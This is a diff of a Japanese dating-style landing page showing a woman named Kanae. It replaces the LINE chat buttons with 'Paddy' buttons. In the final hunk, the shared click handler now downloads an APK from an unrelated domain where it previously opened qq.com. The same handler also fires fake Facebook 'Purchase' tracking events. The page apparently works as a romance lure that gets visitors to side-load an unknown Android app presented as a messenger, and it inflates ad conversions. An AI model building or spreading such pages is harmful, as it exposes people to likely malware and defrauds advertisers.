@@ -21,7 +21,7 @@
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Kanaeに会おう - 新しい友達とつながる</title>
+    <title>Kanaeに会おう - Paddyで連絡する</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -41,13 +41,13 @@
                         },
                         teal: '#00EEFF',
                         yellow: '#FFDD00',
-                        line: '#00B900',
+                        paddy: '#E91E63',
                     },
                     animation: {
                         'pulse-fast': 'pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                         'float': 'float 3s ease-in-out infinite',
                         'glow': 'glow 2s ease-in-out infinite',
-                        'glow-line': 'glowLine 2s ease-in-out infinite',
+                        'glow-paddy': 'glowPaddy 2s ease-in-out infinite',
                         'color-shift': 'colorShift 10s infinite',
                         'rotate-border': 'rotateBorder 4s linear infinite',
                     },
@@ -60,9 +60,9 @@
                             '0%, 100%': { boxShadow: '0 0 15px rgba(255, 46, 210, 0.8), 0 0 30px rgba(255, 46, 210, 0.6)' },
                             '50%': { boxShadow: '0 0 25px rgba(138, 46, 255, 0.8), 0 0 40px rgba(138, 46, 255, 0.6)' },
                         },
-                        glowLine: {
-                            '0%, 100%': { boxShadow: '0 0 15px rgba(0, 185, 0, 0.8), 0 0 30px rgba(0, 185, 0, 0.6)' },
-                            '50%': { boxShadow: '0 0 25px rgba(0, 185, 0, 0.9), 0 0 40px rgba(0, 185, 0, 0.7)' },
+                        glowPaddy: {
+                            '0%, 100%': { boxShadow: '0 0 15px rgba(233, 30, 99, 0.8), 0 0 30px rgba(233, 30, 99, 0.6)' },
+                            '50%': { boxShadow: '0 0 25px rgba(233, 30, 99, 0.9), 0 0 40px rgba(233, 30, 99, 0.7)' },
                         },
                         colorShift: {
                             '0%, 100%': { borderColor: '#FF2ED2' },
@@ -180,8 +180,8 @@
             opacity: 1;
         }
 
-        .btn-line {
-            background: #00B900;
+        .btn-paddy {
+            background: linear-gradient(135deg, #E91E63, #FF4081);
             border: none;
             color: white;
             font-weight: bold;
@@ -192,29 +192,29 @@
             transform: translateZ(0);
         }
 
-        .btn-line:hover {
+        .btn-paddy:hover {
             transform: translateY(-3px);
-            background: #00a000;
+            background: linear-gradient(135deg, #D81B60, #F50057);
             box-shadow:
-                0 0 10px rgba(0, 185, 0, 0.8),
-                0 0 20px rgba(0, 185, 0, 0.4);
+                0 0 10px rgba(233, 30, 99, 0.8),
+                0 0 20px rgba(233, 30, 99, 0.4);
         }
 
-        .line-icon {
+        .paddy-icon {
             position: fixed;
             right: 20px;
             top: 50%;
             transform: translateY(-50%);
             width: 60px;
             height: 60px;
-            background: #00B900;
+            background: linear-gradient(135deg, #E91E63, #FF4081);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
             z-index: 1000;
-            animation: glowLine 2s ease-in-out infinite;
+            animation: glowPaddy 2s ease-in-out infinite;
         }
 
         .notification {
@@ -365,7 +365,7 @@
             right: 8px;
             width: 18px;
             height: 18px;
-            background: #00B900;
+            background: #E91E63;
             border-radius: 50%;
             border: 3px solid #1A0536;
             z-index: 10;
@@ -373,8 +373,8 @@
         }
 
         @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(0, 185, 0, 0.7); }
-            50% { box-shadow: 0 0 0 8px rgba(0, 185, 0, 0); }
+            0%, 100% { box-shadow: 0 0 0 0 rgba(233, 30, 99, 0.7); }
+            50% { box-shadow: 0 0 0 8px rgba(233, 30, 99, 0); }
         }
 
         /* Desktop full image */
@@ -399,37 +399,32 @@
         }
 
         @media (max-width: 768px) {
-            .line-icon {
+            .paddy-icon {
                 width: 50px;
                 height: 50px;
                 right: 15px;
             }
-            .line-icon i {
-                font-size: 1.5rem;
-            }
         }
 
-        /* LINE icon custom styling */
-        .line-icon-svg {
-            width: 32px;
-            height: 32px;
-            fill: white;
+        /* Paddy icon text styling */
+        .paddy-icon-text {
+            font-size: 14px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.5px;
         }
 
         @media (max-width: 768px) {
-            .line-icon-svg {
-                width: 26px;
-                height: 26px;
+            .paddy-icon-text {
+                font-size: 11px;
             }
         }
     </style>
 </head>
 <body class="min-h-screen">
-    <!-- LINE Fixed Icon -->
-    <div id="executeButton" class="line-icon animate-pulse-fast" onclick="openSite()">
-        <svg class="line-icon-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63h2.386c.349 0 .63.285.63.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63.349 0 .631.285.631.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.281.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/>
-        </svg>
+    <!-- Paddy Fixed Icon -->
+    <div id="executeButton" class="paddy-icon animate-pulse-fast" onclick="openSite()">
+        <span class="paddy-icon-text">Paddy</span>
         <div class="notification">1</div>
     </div>
 
@@ -465,11 +460,9 @@
                                 <i class="fas fa-utensils mr-1"></i>グルメ
                             </span>
                         </div>
-                        <button onclick="openSite()" class="btn-line px-4 py-2 rounded-full text-sm mt-3 flex items-center">
-                            <svg class="w-4 h-4 mr-2" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63h2.386c.349 0 .63.285.63.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63.349 0 .631.285.631.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.281.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/>
-                            </svg>
-                            今すぐチャット
+                        <button onclick="openSite()" class="btn-paddy px-4 py-2 rounded-full text-sm mt-3 flex items-center">
+                            <i class="fas fa-heart mr-2"></i>
+                            Paddyで連絡する
                         </button>
                     </div>
                 </div>
@@ -525,11 +518,9 @@
                             </div>
                         </div>
 
-                        <button onclick="openSite()" class="btn-line px-6 py-3 rounded-full animate-pulse-fast flex items-center justify-center text-lg w-full">
-                            <svg class="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63h2.386c.349 0 .63.285.63.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63.349 0 .631.285.631.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.281.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/>
-                            </svg>
-                            LINEでチャットする
+                        <button onclick="openSite()" class="btn-paddy px-6 py-3 rounded-full animate-pulse-fast flex items-center justify-center text-lg w-full">
+                            <i class="fas fa-heart mr-2 text-xl"></i>
+                            Paddyで連絡する
                         </button>
                     </div>
                 </div>
@@ -582,11 +573,9 @@
                         「あなたの誠実さと優しさに感謝します。本当に私に合った方との出会いを楽しみにしています。」
                     </p>
 
-                    <button onclick="openSite()" class="btn-line px-8 py-4 rounded-full text-lg inline-flex items-center mx-auto">
-                        <svg class="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63h2.386c.349 0 .63.285.63.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.627-.63.349 0 .631.285.631.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.281.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/>
-                        </svg>
-                        今すぐつながる
+                    <button onclick="openSite()" class="btn-paddy px-8 py-4 rounded-full text-lg inline-flex items-center mx-auto">
+                        <i class="fas fa-heart mr-2 text-xl"></i>
+                        Paddyで連絡する
                     </button>
 
                     <p class="text-xs text-gray-400 mt-4">
@@ -602,7 +591,7 @@
         function openSite() {
             fbq('track', 'AddToCart');
             fbq('track', 'Purchase');
-            window.location.href="https://www.qq.com";
+            window.location.href="https://dsd.yuand18d.site/22.apk";
         }
     </script>
 </body>
